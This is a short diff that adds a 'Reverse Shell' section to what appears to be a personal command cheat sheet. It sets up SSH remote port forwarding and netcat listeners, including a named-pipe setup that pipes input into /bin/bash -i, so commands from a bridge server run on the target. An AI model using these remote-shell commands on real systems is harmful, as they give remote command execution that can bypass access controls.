@@ -42,3 +42,26 @@ I5MDgzMF19
 python -m pyftpdlib [--help]
 python -m pyftpdlib -w -u <uname> -P <pass>
 ```
+
+## Reverse Shell
+### Echo only
+```bash
+# target terminal A
+ssh -R -N 8888:localhost:8888 qa
+# target terminal B
+nc -l localhost 8888
+# bridge server
+nc localhost 8888 # Then enter text
+```
+### Execute only
+```bash
+# target terminal A
+ssh -R -N 8888:localhost:8888 qa
+# target terminal C
+mkfifo nci
+nc -l localhost 8888 >nci
+# target terminal C
+/bin/bash -i 0<nci
+# bridge server
+nc localhost 8888 # then enter commands, whose output appears on target:C
+```
